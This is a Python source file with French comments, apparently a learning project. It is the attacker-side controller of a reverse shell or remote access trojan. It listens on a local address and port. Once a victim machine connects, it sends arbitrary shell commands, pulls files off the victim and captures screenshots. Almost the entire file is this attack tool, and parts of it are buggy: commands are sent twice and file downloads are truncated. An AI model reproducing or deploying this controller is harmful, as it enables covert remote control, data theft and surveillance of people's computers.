import socket
from PIL import Image
import io

IDENTIFIER = "<END_OF_COMMAND_RESULT>"
EOF_IDENTIFIER = "<END_OF_FILE_IDENTIFIER>"
CHUNK_SIZE = 2048

def receive_file():
    print("Receiving file")

def save_bytes_to_file(bytes_data, file_path):
    try:
        with open(file_path, 'w') as file:
            file.write(bytes_data)
        print(f"Les données ont été enregistrées dans le fichier {file_path}.")
    except Exception as e:
        print(f"Une erreur est survenue : {e}")

if __name__ == "__main__":
    hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    IP = "192.168.1.26"
    PORT = 8200
    socket_address = (IP, PORT)
    hacker_socket.bind(socket_address)
    hacker_socket.listen(5)
    print("Listening for incoming connection requests")
    
    client_socket, client_address = hacker_socket.accept()
    print("Connection established with", client_address)
    
    try:
        while True: 
            command = input("Enter the command: ")
            client_socket.send(command.encode())
            
            if command == "stop":
                client_socket.close()
                break
            elif command == "":
                continue
            elif command.startswith("cd"):
                client_socket.send(command.encode())
                continue
            elif command.startswith("download"):
                print('debut fonc download')
                client_socket.send(command.encode())
                exist = client_socket.recv(CHUNK_SIZE)
                chunk = exist.decode()
                print('apres envoi commandes')
                if chunk != " ":  
                    print("File exists")
                # reçoit le fichier ici
                    file_name = command.strip("download").strip()
                    #with open('test_k.txt' , "w") as file:
                    print("Downloading file")
                    
                   
                        
                    
                    save_bytes_to_file(chunk,"test_download.txt")
                    print("wrinting file")
                    print("Successfully downloaded", file_name)
                        

            elif command == "screenshot":
                print("Taking screenshot")
                with open('screen.png', 'wb') as file: 
                    while True:
                        chunk = client_socket.recv(CHUNK_SIZE)
                        if not chunk :
                            break
                        if EOF_IDENTIFIER.encode() in chunk:
                            chunk = chunk.replace(EOF_IDENTIFIER.encode(), b'')
                            if chunk: 
                                file.write(chunk)
                            break
                        file.write(chunk)
                print('fin du screenshot')
            else:
                full_command_result = b''
                while True:
                    chunk = client_socket.recv(1048)
                    if chunk.endswith(IDENTIFIER.encode()):
                        chunk = chunk[:-len(IDENTIFIER)]
                        full_command_result += chunk
                        break
                    full_command_result += chunk
                print(full_command_result.decode())
    except Exception as e:
        print(f"Exception occdourred: {e}")
        client_socket.close()